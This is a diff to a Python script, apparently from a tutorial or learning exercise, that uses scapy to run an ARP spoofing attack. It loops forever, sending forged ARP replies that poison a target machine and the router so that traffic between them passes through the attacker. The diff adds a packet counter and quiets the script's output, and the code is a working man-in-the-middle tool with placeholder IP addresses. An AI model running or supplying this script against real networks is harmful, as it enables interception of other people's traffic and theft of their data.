@@ -15,7 +15,7 @@ import time
 ##############################################################################
 # Global Variables
 ##############################################################################
-
+sent_packets_count = 0
 
 
 ##############################################################################
@@ -24,7 +24,10 @@ import time
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    scapy.send(packet)
+
+    # Setting the line below to False will allow the script to run without
+    # without displaying its output into the terminal. Keeps things clean.
+    scapy.send(packet, verbose=False)
 
 
 ##############################################################################
@@ -52,8 +55,10 @@ def get_mac(ip):
 # Main
 ##############################################################################
 while True:
-    spoof("insert target IP here", "insert router IP here")
-    spoof("insert router IP here", "insert target IP here")
+    spoof("insert target IP here", "insert router IP here")  # This spoofs the target
+    spoof("insert router IP here", "insert target IP here")  # This spoofs the router
+    sent_packets_count = sent_packets_count + 2
+    print("[+] Packets sent:" + str(sent_packets_count))
     time.sleep(2)
 
 ##############################################################################
